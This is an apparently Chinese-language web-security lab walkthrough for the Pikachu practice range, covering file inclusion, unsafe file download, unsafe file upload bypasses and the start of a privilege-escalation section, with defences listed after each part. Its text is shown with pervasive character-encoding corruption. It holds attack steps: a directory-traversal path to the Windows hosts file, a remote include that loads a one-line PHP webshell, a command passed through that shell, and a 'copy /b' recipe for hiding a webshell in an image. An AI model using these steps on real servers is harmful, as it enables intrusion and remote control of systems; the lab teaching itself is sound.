ä½†æœ‰äº›æ—¶å€™,å› ä¸ºç½‘ç«™åŠŸèƒ½éœ€æ±‚ï¼Œä¼šè®©å‰ç«¯ç”¨æˆ·é€‰æ‹©éœ€è¦åŒ…å«çš„æ–‡ä»¶(æˆ–è€…åœ¨å‰ç«¯çš„åŠŸèƒ½ä¸­ä½¿ç”¨äº†â€åŒ…å«â€åŠŸèƒ½)ï¼Œåˆç”±äºå¼€å‘äººå‘˜æ²¡æœ‰å¯¹è¦åŒ…å«çš„è¿™ä¸ªæ–‡ä»¶è¿›è¡Œå®‰å…¨è€ƒè™‘,å°±å¯¼è‡´æ”»å‡»ç€å¯ä»¥é€šè¿‡ä¿®æ”¹åŒ…å«æ–‡ä»¶çš„ä½ç½®æ¥è®©åå°æ‰§è¡Œä»»æ„æ–‡ä»¶(ä»£ç )ã€‚è¿™ç§æƒ…å†µæˆ‘ä»¬ç§°ä¸º"æ–‡ä»¶åŒ…å«æ¼æ´â€-
æ–‡ä»¶åŒ…å«æ¼æ´æœ‰"æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´â€å’Œ"è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´â€ä¸¤ç§æƒ…å†µã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fba8f02b690c940ca9cb0f85729c8f86d.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
é€šè¿‡include()æˆ–require()è¯­å¥,å¯ä»¥å°†PHPæ–‡ä»¶çš„å†…å®¹æ’å…¥å¦ä¸€ä¸€ä¸ªPHPæ–‡ä»¶(åœ¨æœ-
åŠ¡å™¨æ‰§è¡Œå®ƒä¹‹å‰)ã€‚-
includeå’Œrequireè¯­å¥æ˜¯ç›¸åŒçš„ï¼Œé™¤äº†é”™è¯¯å¤„ç†æ–¹é¢:-
requireä¼šç”Ÿæˆè‡´å‘½é”™è¯¯( E\_ COMPILE ERROR )å¹¶åœæ­¢è„šæœ¬-
includeåªç”Ÿæˆè­¦å‘Š( E WARNING ) ,å¹¶ä¸”è„šæœ¬ä¼šç»§ç»­

    Test. php: 
    <?php $co1or= 'é“¶è‰²çš„' ; $car= 'å¥”é©°è½¿è½¦'; ?>
    Index. html :
    <html> <body> <h1> æ¬¢è¿è®¿é—®æˆ‘çš„é¦–é¡µ! </h1>
    <?php include
    'test .php'; echo "æˆ‘æœ‰ä¸€è¾†â€.
    $color . $car "
    ?>
    </body> </html>
    
    
        

æ‰“å¼€ file include æœ¬åœ°æ–‡ä»¶åŒ…å«ï¼Œç‚¹å‡»wydæäº¤æŸ¥è¯¢ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F8fef9248890a48c59f81908f54438dba.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)

æˆ‘ä»¬è§‚å¯Ÿurlï¼Œæ˜¾ç¤ºæ˜¯ä¸€ä¸ªæ–‡ä»¶file1.phpã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F0a2d2a68c42c49ae9f31ca1c4760410e.png)-
æŒ‰ç…§è®¾è®¡è¿™äº›æ–‡ä»¶éƒ½æ˜¯åå°è‡ªå·±å­˜åœ¨çš„æ–‡ä»¶ã€‚ä½†æ˜¯ç”±äºè¿™ä¸ªæ–‡ä»¶åæ˜¯å‰ç«¯ä¼ å‘åå°çš„ï¼Œä¹Ÿå°±æ„å‘³ç€æˆ‘ä»¬å¯ä»¥ä¿®æ”¹è¿™ä¸ªæ–‡ä»¶ã€‚-
æˆ‘ä»¬å¯ä»¥çŒœæµ‹ä¸€ä¸‹åå°çš„æ“ä½œç³»ç»Ÿæ˜¯win11ï¼Œå…¶ä¸­æœ‰å¾ˆå¤šå›ºå®šçš„é…ç½®æ–‡ä»¶ä¾‹å¦‚â€¦/â€¦/â€¦/â€¦/â€¦/â€¦/-
å¯ä»¥å¤šæ•²å‡ ä¸ªï¼Œæœ€åéƒ½ä¼šè·³åˆ°æ ¹ç›®å½•ã€‚æˆ‘ä»¬å°†æ–‡ä»¶åæ›¿æ¢

    ../../../../Windows/System32/drivers/etc/hosts
    
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F642078dc8e874c2a96b1360d51ff4ed4.png)-
æ‰€æœ‰çš„é…ç½®æ–‡ä»¶å°±æš´éœ²å‡ºæ¥äº†ã€‚

#### 3.6.2è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´

è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´å½¢å¼è·Ÿæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´å·®ä¸å¤š,åœ¨è¿œç¨‹åŒ…å«æ¼æ´ä¸­,æ”»å‡»è€…å¯ä»¥é€šè¿‡è®¿é—®å¤–éƒ¨åœ°å€æ¥åŠ è½½è¿œç¨‹çš„ä»£ç ã€‚-
è¿œç¨‹åŒ…å«æ¼æ´å‰æ:å¦‚æœä½¿ç”¨çš„incldueå’Œrequire ,åˆ™éœ€è¦php.inié…ç½®å¦‚ä¸‹( php5.4.34 ) ï¼š-
allow\_url\_fopen=on//é»˜è®¤æ‰“å¼€-
Allow\_url\_include=on//é»˜è®¤å…³é—­-
å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œå±å®³æå¤§ã€‚-
æˆ‘ä»¬ç°åœ¨phpstudyæ‰“å¼€è¿œç¨‹åŒ…å«ï¼Œå¦åˆ™æ— æ³•è¿›è¡Œé¶åœºè®­ç»ƒã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F499a0bce95054c55b257f663eae04a8b.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
è¿˜æ˜¯é€‰æ‹©ä¸€ä¸ªæ–‡ä»¶æäº¤ï¼Œæ˜¾ç¤ºå›¾ç‰‡æ–‡å­—ï¼Œè§‚å¯Ÿurlã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F6c88c2f614684c94b2efb496dcf2cbee.png)-
å®ƒå®é™…ä¸Šæäº¤çš„æ˜¯ä¸€ä¸ªç›®æ ‡æ–‡ä»¶çš„è·¯å¾„ã€‚æˆ‘ä»¬å¯ä»¥æ”¹æˆä¸€ä¸ªè¿œç«¯çš„è·¯å¾„ï¼Œè¯»å–è¿œç¨‹æ–‡ä»¶ã€‚

    http://pikachu/test/yijuhua.txt
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F16e6049aa2134a6893cfb6aa3f08434f.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
å°†æ–‡ä»¶æ›¿æ¢ä¸ºè¿œç«¯è·¯å¾„ï¼Œå›è½¦ï¼Œä¼šåœ¨æœ¬åœ°ç”Ÿæˆphpæ–‡ä»¶ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fe469a8f9dacc44fd8f6d156cf93e11cf.png)-
å¯¹xä¼ å‚ï¼Œx=ifconfigã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F11f9080871f146f8b0b43b466354dd91.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
ä¹±ç æ˜¯å› ä¸ºé¶åœºæ­è½½windowsä¸Šäº†ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨å“¥æ–¯æ‹‰ã€å†°èç­‰å·¥å…·ã€‚

#### 3.6.3æ–‡ä»¶åŒ…å«æ¼æ´é˜²èŒƒæªæ–½

0.åœ¨åŠŸèƒ½è®¾è®¡ä¸Šå°½é‡ä¸è¦å°†æ–‡ä»¶åŒ…å«å‡½æ•°å¯¹åº”çš„æ–‡ä»¶æ”¾ç»™å‰ç«¯è¿›è¡Œé€‰æ‹©å’Œæ“ä½œã€‚-
1.è¿‡æ»¤å„ç§./. ,http:// ï¼Œhttps://-
2.é…ç½®php.inié…ç½®æ–‡ä»¶:-
allow\_ url fopen = off-
Allow\_ url include= off-
magic quotes\_ gpc=on //gpcåœ¨-
3.é€šè¿‡ç™½åå•ç­–ç•¥ï¼Œä»…å…è®¸åŒ…å«è¿è¡ŒæŒ‡å®šçš„æ–‡ä»¶,å…¶ä»–çš„éƒ½ç¦æ­¢ã€‚

## 3.7 Unsafe file downloads(ä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½)

å¾ˆå¤šç½‘ç«™éƒ½ä¼šæä¾›æ–‡ä»¶ä¸‹è½½åŠŸèƒ½ï¼Œå³ç”¨æˆ·å¯ä»¥é€šè¿‡ç‚¹å‡»ä¸‹è½½é“¾æ¥,ä¸‹è½½åˆ°é“¾æ¥æ‰€å¯¹åº”çš„æ–‡ä»¶ã€‚ä½†æ˜¯ï¼Œå¦‚æœæ–‡ä»¶ä¸‹è½½åŠŸèƒ½è®¾è®¡ä¸å½“ï¼Œåˆ™å¯èƒ½å¯¼è‡´æ”»å‡»ç€å¯ä»¥é€šè¿‡æ„é€ æ–‡ä»¶è·¯å¾„ï¼Œä»è€Œè·å–åˆ°åå°æœåŠ¡å™¨ä¸Šçš„å…¶ä»–çš„æ•æ„Ÿæ–‡ä»¶ã€‚( åˆç§°:ä»»æ„æ–‡ä»¶ä¸‹è½½)-
æ‰“å¼€ unsafe filedownload ä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½ï¼Œæ­£å¸¸åŠŸèƒ½ç‚¹å‡»çƒå‘˜åå­—ï¼Œå°±å¯ä»¥ä¸‹è½½å›¾ç‰‡ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fc5e85c6184c74653a3971f794e92d63e.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_17%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)

æˆ‘ä»¬è§‚å¯Ÿç‚¹å‡»åå­—åçš„urlã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F1f4c4efbdd1b4e75802cd659bd8da81e.png)-
ç›¸å½“äºæŠŠai.pngä¼ åˆ°åå°ï¼Œåå°å»æ‰¾è¿™ä¸ªæ–‡ä»¶ï¼ŒæŠŠæ–‡ä»¶è¯»å–ä¹‹åï¼Œä¼ åˆ°å‰ç«¯ä¸‹è½½ã€‚-
æˆ‘ä»¬ç‚¹å‡»ç§‘æ¯”ï¼Œå°†urlï¼Œæ”¹ä¸ºai.pngã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fff6c3d98010e4a7da3599552c14ad490.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)

æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨ç›®å½•éå†çš„æ–¹å¼å»ä¿®æ”¹é“¾æ¥ä¸‹è½½æ•æ„Ÿæ–‡ä»¶ã€‚-
é˜²èŒƒæªæ–½ï¼š-
1.å¯¹ä¼ å…¥çš„æ–‡ä»¶åè¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤å’Œé™å®š-
2.å¯¹æ–‡ä»¶ä¸‹è½½çš„ç›®å½•è¿›è¡Œä¸¥æ ¼çš„é™å®š

## 3.8 Unsafe file uploads(ä¸å®‰å…¨çš„æ–‡ä»¶ä¸Šä¼ )

#### 3.8.1ä¸å®‰å…¨çš„æ–‡ä»¶ä¸Šä¼ åŸç†åŠå®¢æˆ·ç«¯ç»•è¿‡

å› ä¸ºä¸šåŠ¡åŠŸèƒ½éœ€è¦,å¾ˆå¤šwebç«™ç‚¹éƒ½æœ‰æ–‡ä»¶ä¸Šä¼ çš„æ¥å£,æ¯”å¦‚:-
1.æ³¨å†Œæ—¶ä¸Šä¼ å¤´åƒå›¾ç‰‡(æ¯”å¦‚jpg.png,gifç­‰) ;-
2.ä¸Šä¼ æ–‡ä»¶é™„ä»¶( doc,xIsç­‰) ;-
è€Œåœ¨åå°å¼€å‘æ—¶å¹¶æ²¡æœ‰å¯¹ä¸Šä¼ çš„æ–‡ä»¶åŠŸèƒ½è¿›è¡Œå®‰å…¨è€ƒè™‘æˆ–è€…é‡‡ç”¨äº†æœ‰ç¼ºé™·çš„æªæ–½ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸€äº›æ‰‹æ®µç»•è¿‡å®‰å…¨æªæ–½ä»è€Œä¸Šä¼ ä¸€äº›æ¶æ„æ–‡ä»¶(å¦‚:ä¸€å¥è¯æœ¨é©¬)ä»è€Œé€šè¿‡å¯¹è¯¥æ¶æ„æ–‡ä»¶çš„è®¿é—®æ¥æ§åˆ¶æ•´ä¸ªwebåå°ã€‚

æ–‡ä»¶ä¸Šä¼ æ¼æ´æµ‹è¯•æµç¨‹ï¼š-
1ï¼Œå¯¹æ–‡ä»¶ä¸Šä¼ çš„åœ°æ–¹æŒ‰ç…§è¦æ±‚ä¸Šä¼ æ–‡ä»¶ï¼ŒæŸ¥çœ‹è¿”å›ç»“æœ(è·¯å¾„ï¼Œæç¤ºç­‰);-
2 ï¼Œå°è¯•ä¸Šä¼ ä¸åŒç±»å‹çš„â€œæ¶æ„"æ–‡ä»¶ï¼Œæ¯”å¦‚xx.phpæ–‡ä»¶,åˆ†æç»“æœ;-
3ï¼ŒæŸ¥çœ‹htmlæºç ï¼Œçœ‹æ˜¯å¦é€šè¿‡jsåœ¨å‰ç«¯åšäº†ä¸Šä¼ é™åˆ¶ï¼Œå¯ä»¥ç»•è¿‡;-
4 ï¼Œå°è¯•ä½¿ç”¨ä¸åŒæ–¹å¼è¿›è¡Œç»•è¿‡:é»‘ç™½åå•ç»•è¿‡/MIMEç±»å‹ç»•è¿‡/ç›®å½•0x00æˆªæ–­ç»•è¿‡ç­‰;-
5ï¼ŒçŒœæµ‹æˆ–è€…ç»“åˆå…¶ä»–æ¼æ´(æ¯”å¦‚æ•æ„Ÿä¿¡æ¯æ³„éœ²ç­‰)å¾—åˆ°æœ¨é©¬è·¯å¾„,è¿æ¥æµ‹è¯•ã€‚

æ‰“å¼€ unsafe upfileupload å®¢æˆ·ç«¯checkï¼Œæˆ‘ä»¬æµè§ˆä¸Šä¼ æ–‡ä»¶å‘ç°ï¼Œåªèƒ½ä¸Šä¼ ç…§ç‰‡ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fc3e21d19854d4599979c30ddd38672bb.png)-
ä¸Šä¼ å…¶ä»–ç±»å‹çš„æ–‡ä»¶ä¼šè¢«å‰ç«¯æç¤ºï¼Œè¿™ä¸ªé™åˆ¶å°±æœ‰å¯èƒ½æ˜¯ä»å‰ç«¯è¿›è¡Œé™åˆ¶çš„ã€‚æ‰“å¼€æµè§ˆå™¨æ§åˆ¶å°æŸ¥çœ‹ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F6bff73a8b1d6465492bbd4c2fad4d594.png)-
å†æŸ¥çœ‹æºç -
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F0b930f72939f4f9597c9c8adb473b3da.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_19%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
é€šè¿‡å‰ç«¯å¯¹æ–‡ä»¶è¿›è¡Œäº†é™åˆ¶ã€‚æˆ‘ä»¬å¯ä»¥ç›´æ¥ä¿®æ”¹ä»£ç ï¼ŒæŠŠonchangeçš„å‡½æ•°åˆ æ‰ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fc34f3adbcb20408e93ae9f64a947fba3.png)-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fd050f4f1363848b7b2b503e7d39a3614.png)-
phpæ–‡ä»¶ä¸€å¥è¯æœ¨é©¬æˆåŠŸä¸Šä¼ ã€‚ä¹‹åå°±å¯ä»¥ç»™ç‰¹å®šå€¼ä¼ å‘½ä»¤ï¼Œæ‰§è¡Œæ“ä½œã€‚

#### 3.8.2ä¸Šä¼ æ¼æ´ä¹‹MINE typeéªŒè¯åŸç†å’Œç»•è¿‡

MIME(Multipurpose Internet Mail Extensions)å¤šç”¨é€”äº’è”ç½‘é‚®ä»¶æ‰©å±•ç±»å‹ã€‚æ˜¯è®¾å®šæŸç§æ‰©å±•åçš„æ–‡ä»¶ç”¨ä¸€ç§åº”ç”¨ç¨‹åºæ¥æ‰“å¼€çš„æ–¹å¼ç±»å‹ï¼Œå½“è¯¥æ‰©å±•åæ–‡ä»¶è¢«è®¿é—®çš„æ—¶å€™ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨ä½¿ç”¨æŒ‡å®šåº”ç”¨ç¨‹åºæ¥æ‰“å¼€ã€‚å¤šç”¨äºæŒ‡å®šä¸€äº›å®¢æˆ·ç«¯è‡ªå®šä¹‰çš„æ–‡ä»¶åï¼Œä»¥åŠä¸€äº›åª’ä½“æ–‡ä»¶æ‰“å¼€æ–¹å¼ã€‚-
æ¯ä¸ªMIMEç±»å‹ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼Œå‰é¢æ˜¯æ•°æ®çš„å¤§ç±»åˆ«ï¼Œä¾‹å¦‚å£°éŸ³audioã€å›¾è±¡imageç­‰ï¼Œåé¢å®šä¹‰å…·ä½“çš„ç§ç±»ã€‚å¸¸è§çš„MIMEç±»å‹ï¼Œæ¯”å¦‚:-
è¶…æ–‡æœ¬æ ‡è®°è¯­è¨€æ–‡æœ¬.html.html texthtml-
æ™®é€šæ–‡æœ¬.txt text/plain-
RTFæ–‡æœ¬.rtf application/rtf-
GIFå›¾å½¢.gif image/gif-
JPEGå›¾å½¢.ipeg.jpg image/jpeg

> é€šè¿‡ä½¿ç”¨PHPçš„å…¨å±€æ•°ç»„$\_ FILES ,ä½ å¯ä»¥ä»å®¢æˆ·è®¡ç®—æœºå‘è¿œç¨‹æœåŠ¡å™¨ä¸Šä¼ æ–‡ä»¶ã€‚-
> ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¡¨å•çš„input nameï¼Œç¬¬äºŒä¸ªä¸‹æ ‡å¯ä»¥æ˜¯"name", â€œtypeâ€, â€œsizeâ€, â€œtmp\_ nameâ€ æˆ–"error"

åŒæ ·å…ˆæµ‹è¯•åŠŸèƒ½ï¼Œä¸Šä¼ å›¾ç‰‡æ²¡æœ‰é—®é¢˜ï¼Œç‚¹å‡»ä¸Šä¼ phpæ–‡ä»¶ï¼Œæœ‰é”™è¯¯æç¤ºã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F0a5d3e05c61449818f01bd75262b00bc.png)-
å…ˆä¸Šä¼ ä¸€ä¸ªæ­£å¸¸çš„å›¾ç‰‡ï¼Œåœ¨ä¸Šä¼ ä¸€ä¸ªphpæ–‡ä»¶ï¼Œæ‰“å¼€burpæŠ“åŒ…ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F74062b65fa5a417cab41e8868e01a341.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
ä¸Šä¼ å›¾ç‰‡ï¼Œæ˜¾ç¤ºimage/pngä¸Šä¼ æˆåŠŸã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F08e85eebdcd44b848362031ea0d7f9e7.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
ä¸Šä¼ phpæ–‡ä»¶ï¼Œæ˜¾ç¤ºapplication/octet-streamä¸Šä¼ å¤±è´¥ã€‚å°†ä¸Šä¼ phpæ–‡ä»¶çš„åŒ…å‘é€åˆ°repeaterï¼Œå°†application/octet-streamä¿®æ”¹ä¸ºimage/pngã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F017a9b913c364bdf899295fdfe65b468.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_12%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
é€šè¿‡httpå¤´çš„ä¿®æ”¹ç»•è¿‡äº†MINE typeéªŒè¯æˆåŠŸä¹±æã€‚ä¹‹åå°±æ˜¯è®¿é—®ä¼ å‚ï¼Œé€šè¿‡ä¸€å¥è¯æœ¨é©¬æ§åˆ¶æœåŠ¡å™¨ã€‚

#### 3.8.3æ–‡ä»¶ä¸Šä¼ ä¹‹getimagesizeç»•è¿‡å’Œé˜²èŒƒæªæ–½

Getimagesize ( )è¿”å›ç»“æœä¸­æœ‰æ–‡ä»¶å¤§å°å’Œæ–‡ä»¶ç±»å‹,å¦‚æœç”¨è¿™ä¸ªå‡½æ•°æ¥è·å–ç±»å‹ï¼Œä»è€Œåˆ¤æ–­æ˜¯å¦æ˜¯å›¾ç‰‡çš„è¯ï¼Œä¼šå­˜åœ¨é—®é¢˜ã€‚-
æ˜¯å¦å¯ä»¥ç»•è¿‡å‘¢?å¯ä»¥ï¼Œå› ä¸ºå›¾ç‰‡å¤´å¯ä»¥è¢«ä¼ªé€ ã€‚-
å›¾ç‰‡æœ¨é©¬çš„åˆ¶ä½œ:-
æ–¹æ³•1 :ç›´æ¥ä¼ªé€ å¤´éƒ¨GIF89A-
æ–¹æ³•2.CMD: copy /b test.png + muma.php ccc.png-
æ–¹æ³•3.ä½¿ç”¨GIMP (å¼€æºçš„å›¾ç‰‡ä¿®æ”¹è½¯ä»¶) , é€šè¿‡å¢åŠ å¤‡æ³¨,å†™å…¥æ‰§è¡Œå‘½ä»¤-
æµ‹è¯•åŠŸèƒ½ï¼Œæ²¡æœ‰é—®é¢˜ï¼Œå¼€å§‹åˆ¶ä½œæœ¨é©¬å›¾ç‰‡ã€‚è¿™é‡Œä½¿ç”¨ç¬¬äºŒç§æ–¹æ³•ã€‚-
è¿›å…¥æ¡Œé¢ï¼Œå…ˆè¾“å…¥å‘½ä»¤dirï¼Œä¿è¯å¯ä»¥æ‰¾åˆ°ä½ éœ€è¦çš„æ–‡ä»¶ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F8b2135f4895647c2a75fdaf82a91ef56.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)

ç”Ÿæˆæœ¨é©¬å›¾ç‰‡ã€‚

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F1ebb3ffd4fa94c4e930f0714d24f850f.png)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F182caf6de9c9435aaa97fe4409f184e9.png)-
æ‰“å¼€å±•ç¤ºå®Œå…¨æ²¡æœ‰é—®é¢˜ï¼Œä½†æ˜¯åœ¨16è¿›åˆ¶ä¸­å›¾ç‰‡å†…å®¹åŠ å…¥äº†ä¸€å¥è¯æœ¨é©¬å†…å®¹ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fa36da2374c8d4c86a0fe84f2c6257abb.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
æˆåŠŸä¸Šä¼ æœ¨é©¬å›¾ç‰‡ã€‚æˆ‘ä»¬è®¿é—®è¿™ä¸ªå›¾ç‰‡ä½†æ˜¯ä¸€å¥è¯å¹¶æ²¡æœ‰æ‰§è¡Œï¼Œè¿™æ—¶å€™å°±éœ€è¦ç»“åˆæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´æäº‹æƒ…ã€‚æ‰“å¼€æ–‡ä»¶åŒ…å«æ¼æ´ file includeï¼Œä¸Šä¼ å›¾ç‰‡ï¼Œä¿®æ”¹è·¯å¾„ã€‚å°±å¯ä»¥æ‰§è¡Œphpinfoã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fc23cce7a54f44f9a9e9b7a92c0704fe4.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
é˜²èŒƒæªæ–½ï¼š-
ä¸è¦åœ¨å‰ç«¯ä½¿ç”¨JSå®æ–½ä¸Šä¼ é™åˆ¶ç­–ç•¥-
é€šè¿‡æœåŠ¡ç«¯å¯¹ä¸Šä¼ æ–‡ä»¶è¿›è¡Œé™åˆ¶:-
1.è¿›è¡Œå¤šæ¡ä»¶ç»„åˆæ£€æŸ¥:æ¯”å¦‚æ–‡ä»¶çš„å¤§å°ï¼Œè·¯å¾„ï¼Œæ‰©å±•å,æ–‡ä»¶ç±»å‹ï¼Œæ–‡ä»¶å®Œæ•´æ€§-
2.å¯¹ä¸Šä¼ çš„æ–‡ä»¶åœ¨æœåŠ¡å™¨ä¸Šå­˜å‚¨æ—¶è¿›è¡Œé‡å‘½å(åˆ¶å®šåˆç†çš„å‘½åè§„åˆ™)-
3.å¯¹æœåŠ¡å™¨ç«¯ä¸Šä¼ æ–‡ä»¶çš„ç›®å½•è¿›è¡Œæƒé™æ§åˆ¶(æ¯”å¦‚åªè¯»)ï¼Œ é™åˆ¶æ‰§è¡Œæƒé™å¸¦æ¥çš„å±å®³

## 3.9 Over Permisson(è¶Šæƒæ¼æ´)

#### 3.9.1è¶Šæƒæ¼æ´åŸç†åŠæ°´å¹³è¶Šæƒ

è¶Šæƒæ¼æ´æ¦‚è¿°-
ç”±äºæ²¡æœ‰ç”¨æˆ·æƒé™è¿›è¡Œä¸¥æ ¼çš„åˆ¤æ–­ï¼Œå¯¼è‡´ä½æƒé™çš„è´¦å·(æ¯”å¦‚æ™®é€šç”¨æˆ·)å¯ä»¥å»å®Œæˆé«˜æƒé™è´¦å·( æ¯”å¦‚è¶…çº§ç®¡ç†å‘˜)èŒƒå›´å†…çš„æ“ä½œã€‚-
å¹³è¡Œè¶Šæƒ: Aç”¨æˆ·å’ŒBç”¨æˆ·å±äºåŒä¸€çº§åˆ«ç”¨æˆ·,ä½†å„è‡ªä¸èƒ½æ“ä½œå¯¹æ–¹ä¸ªäººä¿¡æ¯, Aç”¨æˆ·å¦‚æœè¶Šæƒæ“ä½œBç”¨æˆ·çš„ä¸ªäººä¿¡æ¯çš„æƒ…å†µç§°ä¸ºå¹³è¡Œè¶Šæƒæ“ä½œ-
å‚ç›´è¶Šæƒã€‚Aç”¨æˆ·æƒé™é«˜äºBç”¨æˆ· , Bç”¨æˆ·è¶Šæƒæ“ä½œAç”¨æˆ·çš„æƒé™çš„æƒ…å†µç§°ä¸ºå‚ç›´è¶Šæƒã€‚-
